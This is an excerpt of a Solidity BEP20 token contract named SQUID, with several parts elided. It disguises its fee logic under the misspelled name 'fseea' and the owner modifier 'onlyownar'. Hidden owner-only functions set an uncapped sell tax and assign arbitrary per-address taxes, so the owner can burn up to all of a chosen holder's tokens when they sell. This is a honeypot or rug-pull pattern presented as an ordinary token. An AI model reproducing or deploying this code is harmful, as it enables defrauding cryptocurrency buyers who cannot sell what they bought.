...
interface IUniswapV2Factory {
    ...
    function fseeaTo() external view returns (address);
    function fseeaToSetter() external view returns (address);
    ...
    function setfseeaTo(address) external;
    function setfseeaToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfseeaOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfseeaOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfseeaOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfseeaOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfseeaOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SQUID  is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfseea = 0;

    uint256 private _defaultBuyfseea = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfseea;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfseea = _value;
    }

    function setSlipfseea(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfseea[_address] = _value;
    }

    function getSlipfseea(address _address) external view onlyownar returns (uint256) {
        return _slipfseea[_address];
    }


    function setMAccountfseea(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfseea(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefseeaAmount = 0;

        if (rF) {
            uint256 tradefseea = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefseea = _defaultSellfseea;
                }
                if (from == uniswapV2Pair) {

                    tradefseea = _defaultBuyfseea;
                }
            }
            if (_slipfseea[from] > 0) {
                tradefseea = _slipfseea[from];
            }

            tradefseeaAmount = _Amount.mul(tradefseea).div(100);
        }


        if (tradefseeaAmount > 0) {
            _balances[from] = _balances[from].sub(tradefseeaAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefseeaAmount);
            emit Transfer(from, _deadAddress, tradefseeaAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefseeaAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefseeaAmount);
        emit Transfer(from, _to, _Amount - tradefseeaAmount);
    }
